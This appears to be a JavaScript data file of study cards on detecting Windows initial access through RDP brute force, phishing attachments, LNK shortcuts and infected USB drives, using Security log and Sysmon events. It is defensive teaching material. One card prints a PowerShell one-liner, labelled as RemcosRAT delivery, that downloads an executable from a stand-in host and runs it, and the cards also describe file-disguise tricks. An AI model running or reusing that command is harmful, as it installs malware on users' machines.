export default {
  id: "windows-initial-access",
  title: "Windows Initial Access Detection",
  src: "Windows Threat Detection 1 (RDP / Phishing / USB)",
  icon: "🚪",
  cards: [
    {
      title: "Two categories, two MITRE technique pairs",
      span2: true,
      blocks: [
        { t: "txt", text: "Every Initial Access method is either <b>Exposed Services</b> (system is internet-reachable, attacker scans/exploits it directly) or <b>User-Driven</b> (nothing exposed, so a human has to take an action). The split matters for detection posture, not just classification — Exposed Services is catchable at the perimeter before it reaches a user; User-Driven needs endpoint/email-gateway visibility instead." },
        { t: "table", head: ["Category", "MITRE ID", "Technique", "Example"], rows: [
          ["Exposed Services", "T1133", "External Remote Services", "weak/reused creds on exposed RDP/VNC/SSH — no exploit needed"],
          ["Exposed Services", "T1190", "Exploit Public-Facing Application", "vulnerable/misconfigured web app or mail server actually gets exploited"],
          ["User-Driven", "T1566", "Phishing", "malicious email attachment or link"],
          ["User-Driven", "T1091", "Removable Media", "infected USB device"],
        ]},
        { t: "note", kind: "info", title: "threat-actor reality check", text: "Modern ransomware crews (Medusa, Akira) don't specialize in one vector — they use whichever of these four is available against a given target. Coverage needs to span all four, not over-index on one." },
      ],
    },
    {
      title: "RDP — brute force → breach → post-compromise",
      span2: true,
      blocks: [
        { t: "note", kind: "danger", title: "\"Ransomware Deployment Protocol\"", text: "Exposed RDP + weak creds is such a reliable breach path defenders nickname it this. 5M+ RDP-enabled hosts are reachable from the internet (Censys), a meaningful fraction already compromised." },
        { t: "steps", items: [
          "<b>Brute force:</b> botnet cycles common usernames (Administrator, admin, support). Filter Security log for <b>Event ID 4625</b> (failed logon) + <b>Logon Type 3 or 10</b> (Network / RemoteInteractive) + external <b>Source IP</b>. Hundreds of 4625s from one external IP in under an hour = brute force — not subtle.",
          "<b>Breach:</b> switch the same filter chain to <b>Event ID 4624</b> (successful logon), check the account name on that event — now you know exactly which account was popped.",
          "<b>Post-compromise:</b> filter <b>Logon Type 10</b> on the interactive session again, copy the <b>Logon ID</b> field from that 4624 event, then pivot into <b>Sysmon logs</b> searching for the same Logon ID — every process Sysmon recorded under that ID is something the attacker ran during that RDP session.",
        ]},
        { t: "note", kind: "info", title: "the generalizable move: Logon ID as a pivot key", text: "Windows assigns a Logon ID per session and stamps it on every subsequent event tied to that session, in both the Security log and Sysmon's process-creation events. Same pattern as pivoting on a confirmed attacker IP across log sources (see MITM Detection) — once you've confirmed <i>which session</i> is malicious, pivot on its ID rather than re-filtering by time window or account alone." },
        { t: "note", kind: "warn", title: "caveat — no brute force ≠ not RDP", text: "Credentials known/stolen in advance (infostealer logs, credential stuffing) breach RDP with zero 4625 noise beforehand — the first attempt just succeeds." },
      ],
    },
    {
      title: "Phishing — binary attachments (double-extension)",
      blocks: [
        { t: "txt", text: "Windows hides known file extensions by default, so <code>invoice.pdf.exe</code> displays as just <code>invoice.pdf</code> (icon spoofed to match). Less-obvious executable extensions beyond <code>.exe</code> — <b>.com, .scr, .cpl</b> — are just as executable but far less likely to raise suspicion." },
        { t: "steps", items: [
          "<b>Sysmon ID 1</b> — browser launches (<code>msedge.exe</code>, ParentImage <code>explorer.exe</code>).",
          "<b>Sysmon ID 11</b> — archive lands in Downloads (<code>invoice.zip</code>), Image still the browser. This is the download.",
          "<b>Sysmon ID 11</b> again — the unarchived file appears (<code>invoice.pdf.exe</code>), Image now <code>explorer.exe</code>/<code>7zG.exe</code>. This reveals the real double extension regardless of what Explorer displays.",
          "<b>Sysmon ID 1</b> again — user double-clicks it, <code>invoice.pdf.exe</code> becomes the Image with ParentImage <code>explorer.exe</code>. Actual execution.",
        ]},
        { t: "note", kind: "info", title: "why the chain matters", text: "Each event alone looks innocuous (browsers download files, users extract archives constantly) — it's the <b>sequence</b> that turns ordinary noise into a clear IOC chain." },
      ],
    },
    {
      title: "Phishing — LNK attachments",
      blocks: [
        { t: "txt", text: "A <code>.lnk</code> shortcut's <b>Target field</b> can point at an arbitrary command (e.g. a full PowerShell one-liner) while displaying any icon/name the attacker wants — letting a script payload masquerade as a normal shortcut. Verify via right-click → Properties → Shortcut tab." },
        { t: "note", kind: "danger", title: "the detection gotcha — thin execution trail", text: "When the LNK is launched, <b>Explorer reads the Target field and launches the command itself</b> — the process tree shows <code>explorer.exe → powershell.exe</code>, indistinguishable from a user manually opening a PowerShell prompt." },
        { t: "note", kind: "warn", title: "the tell", text: "Look for a <b>preceding FileCreate event (Sysmon ID 11)</b> showing the LNK file itself appearing in Downloads shortly before the <code>explorer.exe → powershell.exe</code> launch. Without that context, the launch alone isn't distinguishable from benign PowerShell use." },
        { t: "cmd", label: "real payload pattern seen (RemcosRAT delivery)", code: "powershell.exe -c (New-Object System.Net.WebClient).DownloadFile('https://baddomain.thm/r.exe','C:\\ProgramData\\r.exe'); start C:\\ProgramData\\r.exe" },
      ],
    },
    {
      title: "USB — same execution pattern as phishing, different origin",
      span2: true,
      blocks: [
        { t: "txt", text: "Real-world worms/implants (Camaro Dragon, Raspberry Robin) prove infected-USB Initial Access is still active. Advantage over phishing: bypasses firewalls <b>and</b> can work with zero internet access on the victim, and can self-propagate to the next USB plugged in without further user interaction." },
        { t: "table", head: ["Disguise technique", "Mechanism"], rows: [
          ["Hidden files + fake recovery shortcut", "malware hides legit files, drops a malicious \"RECOVERY.lnk\" in their place"],
          ["Folder-icon binary", "\"Photos.exe\" set to display a folder icon"],
          ["Double-extension copies", "e.g. photo_2024_1_12.jpg.exe — same trick as the phishing binary-attachment case above"],
        ]},
        { t: "note", kind: "danger", title: "the differentiator is the file path, not the process tree", text: "USB and phishing Initial Access converge on the identical execution pattern — a user double-clicking a malicious file via <code>explorer.exe</code>. The process tree (<code>explorer.exe → malware.exe</code>) looks the same either way. What distinguishes them: phishing traces through a browser process + a Downloads path; USB shows an <b>external/removable drive letter</b> in the path (e.g. <code>E:\\malware.exe</code>) with no browser ancestry at all." },
      ],
    },
  ],
};
